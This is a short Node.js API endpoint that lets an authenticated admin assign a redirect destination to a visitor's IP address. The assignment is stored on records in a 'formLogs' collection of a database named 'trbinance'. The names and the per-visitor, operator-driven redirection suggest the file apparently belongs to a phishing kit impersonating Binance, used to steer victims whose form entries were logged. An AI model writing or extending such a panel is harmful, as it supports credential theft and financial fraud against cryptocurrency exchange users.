const clientPromise = require('../../lib/mongo');
const { verifyAdmin } = require('../../lib/auth');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    await verifyAdmin(req);

    const body = await new Promise((resolve, reject) => {
      const chunks = [];
      req.on('data', chunk => chunks.push(chunk));
      req.on('end', () => {
        try {
          const raw = Buffer.concat(chunks).toString() || '{}';
          resolve(JSON.parse(raw));
        } catch (err) {
          reject(err);
        }
      });
      req.on('error', reject);
    });

    const { ip, redirectTo } = body || {};

    if (!ip || !redirectTo) {
      return res.status(400).json({ error: 'IP and redirectTo are required' });
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    await logs.updateOne(
      { ip },
      {
        $set: {
          redirectTo: String(redirectTo).slice(0, 200),
          redirectAt: new Date()
        }
      }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    if (err.code === 401) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    if (err.code === 500) {
      return res.status(500).json({ error: 'Server misconfigured' });
    }
    console.error('Redirect API error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};

